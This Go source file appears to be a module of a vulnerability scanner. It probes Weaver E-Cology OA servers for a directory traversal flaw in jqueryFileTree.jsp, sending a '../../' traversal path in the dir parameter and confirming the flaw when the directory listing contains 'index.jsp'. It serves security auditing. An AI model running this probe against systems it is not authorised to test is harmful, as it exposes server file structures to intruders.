package ecology_filedownload_directory_jqueryFileTree

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func checkVulnerability(url string) bool {
	vulnUrl := url + "/hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).
		Get(vulnUrl)

	if err == nil && resp.StatusCode == 200 {
		return strings.Contains(resp.String(), "index.jsp")
	}
	return false
}

func Run(url string) {
	if checkVulnerability(url) {
		cheurl := url + "/hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../"
		color.Green.Println("[+04] 泛微OA E-Cology jqueryFileTree.jsp 目录遍历漏洞存在 -> ", cheurl)
	} else {
		color.Red.Println("[-04] 泛微OA E-Cology jqueryFileTree.jsp 目录遍历漏洞不存在")
	}
}
